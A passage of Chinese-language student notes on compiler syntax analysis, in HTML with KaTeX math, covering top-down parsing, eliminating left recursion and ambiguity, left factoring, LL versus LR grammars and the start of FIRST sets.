mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord">∗</span></span></span></span>。那么在判断某个句子的时候，可能会陷入循环<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo>→</mo><mi>S</mi><mi>a</mi><mi>y</mi><mi>a</mi><mi>y</mi><mi>a</mi><mi>y</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>a</mi><mi>y</mi><mi>a</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">S\rightarrow Sayayay...ayay</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。</p></li></ol><h3 id="重要概念回顾"><a class="markdownIt-Anchor" href="#重要概念回顾"></a> 重要概念回顾</h3><ol><li>推导：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mi>A</mi><mi>β</mi><mo>⇒</mo><mi>α</mi><mi>γ</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">\alpha A\beta \Rightarrow \alpha\gamma\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>（依据<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>γ</mi></mrow><annotation encoding="application/x-tex">A\rightarrow\gamma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span></span></span></span>）</li><li>最左（Left-most）推导——最左分析<ul><li>左句型</li><li>最左推导对应最右规约</li></ul></li><li>最右（Right-most）推导——最右分析<ul><li>规范推导、规范句型（右句型）</li><li>最右推导对应最左规约（规范规约）</li></ul></li><li>二义性（先天二义性语言、二义性文法）</li></ol><h2 id="第四章-语法分析"><a class="markdownIt-Anchor" href="#第四章-语法分析"></a> 第四章 语法分析</h2><h3 id="语法分析的功能-2"><a class="markdownIt-Anchor" href="#语法分析的功能-2"></a> 语法分析的功能</h3><p>检查由扫描器输出的单词符号序列是否符合该语言的文法——句子。</p><blockquote><p>经过我们形式语言的学习，我们已经知道了一个文法可以生成一个语言。而句子就是语言这个集合中的一个元素。</p></blockquote><p>语法分析器的输入：Token序列</p><p>语法分析器的输出：分析树</p><p>出错处理：定位、续编译</p><p>分析方法： 自顶向下（递归下降 预测分析）  自底向上（算符优先 LR分析器）</p><h3 id="自顶向下的分析-2"><a class="markdownIt-Anchor" href="#自顶向下的分析-2"></a> 自顶向下的分析</h3><p>从文法的开始符号出发，寻求所给的输入符号串的最左推导</p><p>从树根S开始，构造所给输入符号串的语法树。</p><p><img src="https://upyun.wuuconix.link/image-20211107201851980.png" alt="例子" /></p><p>自顶向下的分析可能会产生回溯。</p><p><img src="https://upyun.wuuconix.link/image-20211107202253270.png" alt="回溯" /></p><p>产生回溯的原因是因为文法产生式的右侧如果有多个候选式，并且这几个候选式的第一个符号相同的话，那么语法分析程序就无法根据当前输入符号来选择产生式，只能去试探。试探的时候发现出错了，就需要回溯。</p><p>左递归问题</p><p><img src="https://upyun.wuuconix.link/image-20211107202756454.png" alt="左递归" /></p><p>这个左递归确实非常离谱。因为如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span></span></span></span>一开始推到为了*。因为*是一个终结符号，它就不会往后继续推导了。所以语法分析器就会认为这样不对。进行回溯。</p><p>语法分析器接着会去尝试推到为Say，发现不对，继续推导，还是不对，永远的循环。</p><p>感觉左递归问题应该是文法写的不好。如果这里文法写为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo>→</mo><mo>∗</mo><mi>S</mi><mi mathvariant="normal">∣</mi><mi>S</mi><mi>a</mi><mi>y</mi><mi mathvariant="normal">∣</mi><mi>a</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">S\rightarrow*S|Say|ay</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∗</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>就可以产生出*ayay了。</p><p><img src="https://upyun.wuuconix.link/image-20211107203430329.png" alt="重要概念回顾" /></p><p><img src="https://upyun.wuuconix.link/image-20211107203452885.png" alt="消除二义性的方法" /></p><p>以下是更加直观的二义性的例子。所以二义性，就是同一个句子，当我们推导的顺序不同时，可能会产生出不同的结果。【实际上更加专业说会产生出两颗不同的语法树】</p><p><img src="https://upyun.wuuconix.link/image-20211107204152350.png" alt="if 二义性" /></p><p>解决的办法就是重写文法，并且引入新的语法变量</p><p><img src="https://upyun.wuuconix.link/image-20211107204853638.png" alt="if 消除二义性" /></p><p>注意这里的M 后面的other的位置。实际上时<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>→</mo><mo stretchy="false">[</mo><mi>i</mi><mi>f</mi><mtext> </mtext><mi>E</mi><mtext> </mtext><mi>t</mi><mi>h</mi><mi>e</mi><mi>n</mi><mtext> </mtext><mi>M</mi><mtext> </mtext><mi>e</mi><mi>l</mi><mi>s</mi><mi>e</mi><mtext> </mtext><mi>M</mi><mo stretchy="false">]</mo><mi mathvariant="normal">∣</mi><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi></mrow><annotation encoding="application/x-tex">M\rightarrow [if\ E\ then\ M\ else\ M]|other</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace"> </span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace"> </span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mspace"> </span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mclose">]</span><span class="mord">∣</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span></span></span></span></p><p>所以如果是有一些不是if else的结果的式子的话，就得选择M得other。</p><p><img src="https://upyun.wuuconix.link/image-20211107205853120.png" alt="if 语法树" /></p><p>这样改造后消除了二义性。</p><p>实际上对于 if <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi mathvariant="normal">≠</mi><mn>0</mn></mrow><annotation encoding="application/x-tex">a\neq0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> then if <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">a\gt0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> then b=1 else b = -1</p><p>这个改造后得文法将会把把第一个if后面得句子看作一个整体，也就是  if <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi mathvariant="normal">≠</mi><mn>0</mn></mrow><annotation encoding="application/x-tex">a\neq0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> then {if <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">a\gt0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> then b=1 else b = -1}。</p><h3 id="左递归得消除方法"><a class="markdownIt-Anchor" href="#左递归得消除方法"></a> 左递归得消除方法</h3><ol><li><p>直接左递归 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>⇒</mo><mi>A</mi><mi>α</mi></mrow><annotation encoding="application/x-tex">A\Rightarrow A\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span></p></li><li><p>间接左递归 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><msup><mo>⇒</mo><mo>+</mo></msup><mi>A</mi><mi>α</mi></mrow><annotation encoding="application/x-tex">A\Rightarrow^+ A\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.771331em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">⇒</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.771331em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span></p><blockquote><p>先复习形式语言还是有好处得，这里得加号就是经过1步以上推导得意思。</p></blockquote></li><li><p>消除方法</p><p>将<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><mi>α</mi><mi mathvariant="normal">∣</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow A\alpha|\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span> 替换为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>β</mi><msup><mi>A</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">A\rightarrow\beta A&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>A</mi><mo mathvariant="normal">′</mo></msup><mo>→</mo><mi>α</mi><mi>A</mi><msup><mi mathvariant="normal">∣</mi><mo mathvariant="normal">′</mo></msup><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">A&#x27;\rightarrow\alpha A|&#x27;\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord mathdefault">A</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">ϵ</span></span></span></span></p><p>主要方法就是利用增加语法变量的方法，将产生式的右侧中的语法变量不在最左侧。</p><p>这个消除方法貌似很重要，需要背下来。</p></li></ol><h3 id="直接左递归消除"><a class="markdownIt-Anchor" href="#直接左递归消除"></a> 直接左递归消除</h3><p>利用上面说的消除公式来直接消除。什么样的产生式需要消除呢？只需要看产生式右侧是不是满足<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><mi>α</mi><mi mathvariant="normal">∣</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow A\alpha |\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>的形式，即是有候选式，并且第一个候选式的最左边是一个语法变量。</p><p><img src="https://upyun.wuuconix.link/image-20211107212225196.png" alt="直接左递归消除例子" /></p><p>在这里例子中就将前两个产生式进行了直接左递归消除。第三个式子不用消除，为什么呢？因为它虽然有两个候选式，但是第一个候选式的左侧是一个左括号，它是一个终结符号，不是一个语法变量，所以不需要进行左递归消除。</p><h3 id="间接左递归消除"><a class="markdownIt-Anchor" href="#间接左递归消除"></a> 间接左递归消除</h3><p><img src="https://upyun.wuuconix.link/image-20211107212505305.png" alt="间接左递归消除" /></p><p>它利用的方法就是把所有的产生式从低级往高级慢慢代进去，最后得到一个S（即开始符号）的产生式。</p><p>这个时候一般只有一个产生式了，看这个S的产生式是不是可以符合<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><mi>α</mi><mi mathvariant="normal">∣</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow A\alpha|\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>的模式。</p><p>如果是，则利用公式进行左递归消除。</p><p>这里我们也见证了如果右侧是多个候选式的处理办法，因为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>A</mi><mi>α</mi><mi mathvariant="normal">∣</mi><mi>β</mi></mrow><annotation encoding="application/x-tex">A\rightarrow A\alpha|\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span> 消除式子中看起来只有两个候选式嘛，而上面的例子中S的产生式有4个候选式，其中第一个候选式中的第一个是语法变量。</p><p>所以我们需要把后面三个候选式看成一个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span></span></span></span>。然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>β</mi><msup><mi>A</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">A\rightarrow \beta A&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mord"><span class="mord mathdefault">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>要怎么弄呢？</p><p>我们看到它们三个候选式都分别成了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>S</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">S&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>。</p><p>变成了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>b</mi><mi>c</mi><msup><mi>S</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>b</mi><mi>c</mi><msup><mi>S</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">∣</mi><mi>c</mi><msup><mi>S</mi><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">abcS&#x27;|bcS&#x27;|cS&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathdefault">c</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>。</p><h3 id="消除左递归的一般方法"><a class="markdownIt-Anchor" href="#消除左递归的一般方法"></a> 消除左递归的一般方法</h3><p><img src="https://upyun.wuuconix.link/image-20211107215308974.png" alt="消除左递归的一般方法" /></p><p>这个产生式组不知道是怎么得到的。</p><h3 id="解决回溯问题-提取左因子"><a class="markdownIt-Anchor" href="#解决回溯问题-提取左因子"></a> 解决回溯问题 ——提取左因子</h3><p><img src="https://upyun.wuuconix.link/image-20211107215435123.png" alt="解决回溯问题1" /></p><p><img src="https://upyun.wuuconix.link/image-20211107215804999.png" alt="左因子提取方法" /></p><p>实际上就是将两个产生式共同部分单独写出了形成一个产生式。这样语法分析器就不会犯选择困难症了。因为现在只有一个产生式供它选择。</p><h3 id="cfg的使用限制"><a class="markdownIt-Anchor" href="#cfg的使用限制"></a> CFG的使用限制</h3><ol><li>没有一种方法能够有效地分析所有上下文无关文法 context free grammar<ul><li>存在无法处理地2型文法</li></ul></li><li>每种方法能够处理一部分上下文无关文法<ul><li>每种方法都有适用范围</li></ul></li></ol><h3 id="常用文法与分析方法"><a class="markdownIt-Anchor" href="#常用文法与分析方法"></a> 常用文法与分析方法</h3><ol><li><p>LL方法和LR文法都是CFG的子集（无二义性）</p><p>可用不同的文法来描述同一种语言</p></li><li><p>对于不同的文法，可用不同的分析方法</p><ul><li>LL文法——递归下降分析法、预测分析法</li><li>LR文法——LR分析法</li><li>LL文法多用于编译的手工实现</li><li>LR文法多用于编译的自动实现</li></ul></li></ol><h3 id="自顶向下的分析方法"><a class="markdownIt-Anchor" href="#自顶向下的分析方法"></a> 自顶向下的分析方法</h3><p>基本思想</p><ol><li>寻找输入符号串的最左推导</li><li>试图根据当前输入单词判断适用哪个产生式</li></ol><p>基本过程</p><p>从根开始，按与最左推导相对应的顺序，构造输入符号串 token的分析树。</p><h3 id="自顶向下例子1"><a class="markdownIt-Anchor" href="#自顶向下例子1"></a> 自顶向下例子1</h3><p><img src="https://upyun.wuuconix.link/image-20211108195544776.png" alt="例1" /></p><p><img src="https://upyun.wuuconix.link/image-20211108195609224.png" alt="解" /></p><p><img src="https://upyun.wuuconix.link/image-20211108195623493.png" alt="解" /></p><h3 id="first集"><a class="markdownIt-Anchor" href="#first集"></a> FIRST集</h3><p>定义：对于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∀</mi><mi>α</mi><mo>∈</mo><mo stretchy="false">(</mo><msub><mi>V</mi><mi>T</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>N</mi></msub><msup><mo stretchy="false">)</mo><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">\forall\alpha\in(V_T\cup V_N)^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span 